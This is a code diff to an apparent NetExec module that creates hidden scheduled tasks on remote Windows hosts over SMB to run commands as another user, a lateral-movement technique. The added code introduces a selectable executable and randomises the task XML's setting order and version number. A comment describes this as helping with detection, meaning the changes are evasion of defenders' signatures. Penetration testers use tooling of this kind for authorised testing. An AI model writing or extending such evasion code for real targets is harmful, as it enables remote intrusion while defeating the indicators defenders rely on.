@@ -1,4 +1,5 @@
 import os
+import random
 import contextlib
 from time import sleep
 from datetime import datetime, timedelta
@@ -15,6 +16,8 @@ class NXCModule:
     Thanks @Shad0wC0ntr0ller for the idea of removing the hardcoded date that could be used as an IOC
     Modified by @Defte_ so that output on multiples lines are printed correctly (28/04/2025)
     Modified by @Defte_ so that we can upload a custom binary to execute using the BINARY option (28/04/2025)
+    Modified by @Kahvi0xff to add the TASK, FILE and LOCATION options. 
+    Modified by @Kahvi0xff add a feature to shuffle the XML file attributes
     """
 
     def options(self, context, module_options):
@@ -31,7 +34,7 @@ class NXCModule:
         nxc smb <ip> -u <user> -p <password> -M schtask_as -o USER=Administrator CMD=whoami
         nxc smb <ip> -u <user> -p <password> -M schtask_as -o USER=Administrator CMD='bin.exe --option' BINARY=bin.exe
         """
-        self.cmd = self.binary = self.user = self.task = self.file = self.location = self.time = None
+        self.cmd = self.binary = self.user = self.task = self.file = self.location = self.execm = self.time = None
         self.share = "C$"
         self.tmp_dir = "C:\\Windows\\Temp\\"
         self.tmp_share = self.tmp_dir.split(":")[1]
@@ -41,6 +44,9 @@ class NXCModule:
 
         if "BINARY" in module_options:
             self.binary = module_options["BINARY"]
+
+        if "EXECM" in module_options:
+            self.execm = module_options["EXECM"]
 
         if "USER" in module_options:
             self.user = module_options["USER"]
@@ -101,6 +107,7 @@ class NXCModule:
                 self.file,
                 self.task,
                 self.location,
+                self.execm,
                 connection.kerberos,
                 connection.aesKey,
                 connection.host,
@@ -141,7 +148,7 @@ class NXCModule:
 
 
 class TSCH_EXEC:
-    def __init__(self, target, share_name, username, password, domain, user, cmd, file, task, location, doKerberos=False, aesKey=None, remoteHost=None, kdcHost=None, hashes=None, logger=None, tries=None, share=None):
+    def __init__(self, target, share_name, username, password, domain, user, cmd, file, task, location, execm, doKerberos=False, aesKey=None, remoteHost=None, kdcHost=None, hashes=None, logger=None, tries=None, share=None):
         self.__target = target
         self.__username = username
         self.__password = password
@@ -164,6 +171,7 @@ class TSCH_EXEC:
         self.file = file
         self.task = task
         self.location = location
+        self.execm = execm
 
         if hashes is not None:
             if hashes.find(":") != -1:
@@ -218,8 +226,42 @@ class TSCH_EXEC:
         return end_boundary.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3]
 
     def gen_xml(self, command, fileless=False):
+       #Random setting order to help with detection
+        settings = [
+            "    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>",
+            "    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>",
+            "    <AllowHardTerminate>true</AllowHardTerminate>",
+            "    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>",
+            "    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>"
+        ]
+        random.shuffle(settings)
+        randomized_settings = "\n".join(settings)
+        
+        settings2 = [
+            "    <AllowStartOnDemand>true</AllowStartOnDemand>",
+            "    <Hidden>true</Hidden>",
+            "    <Enabled>true</Enabled>",
+            "    <RunOnlyIfIdle>false</RunOnlyIfIdle>",
+            "    <WakeToRun>false</WakeToRun>",
+            "    <Priority>7</Priority>",
+            "    <ExecutionTimeLimit>P3D</ExecutionTimeLimit>"
+        ]
+        random.shuffle(settings2)
+        randomized_settings2 = "\n".join(settings2)
+        
+        IdleSettings = [
+            "      <StopOnIdleEnd>true</StopOnIdleEnd>",
+            "      <RestartOnIdle>false</RestartOnIdle>"
+        ]
+        random.shuffle(IdleSettings)
+        randomized_IdleSettings = "\n".join(IdleSettings)
+        
+        random_digit = random.randint(2, 6)
+            
+        exemethod = "cmd.exe" if self.execm is None else self.execm    
+                     
         xml = f"""<?xml version="1.0" encoding="UTF-16"?>
-<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+<Task version="1.{random_digit}" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
   <Triggers>
     <RegistrationTrigger>
       <EndBoundary>{self.get_end_boundary()}</EndBoundary>
@@ -232,26 +274,15 @@ class TSCH_EXEC:
     </Principal>
   </Principals>
   <Settings>
-    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
-    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
-    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
-    <AllowHardTerminate>true</AllowHardTerminate>
-    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
+{randomized_settings}
     <IdleSettings>
-      <StopOnIdleEnd>true</StopOnIdleEnd>
-      <RestartOnIdle>false</RestartOnIdle>
+{randomized_IdleSettings}
     </IdleSettings>
-    <AllowStartOnDemand>true</AllowStartOnDemand>
-    <Enabled>true</Enabled>
-    <Hidden>true</Hidden>
-    <RunOnlyIfIdle>false</RunOnlyIfIdle>
-    <WakeToRun>false</WakeToRun>
-    <ExecutionTimeLimit>P3D</ExecutionTimeLimit>
-    <Priority>7</Priority>
+{randomized_settings2}
   </Settings>
   <Actions Context="LocalSystem">
     <Exec>
-      <Command>cmd.exe</Command>
+      <Command>{exemethod}</Command>
 """
         if self.__retOutput:
             fileLocation = "\\Windows\\Temp\\" if self.location is None else self.location
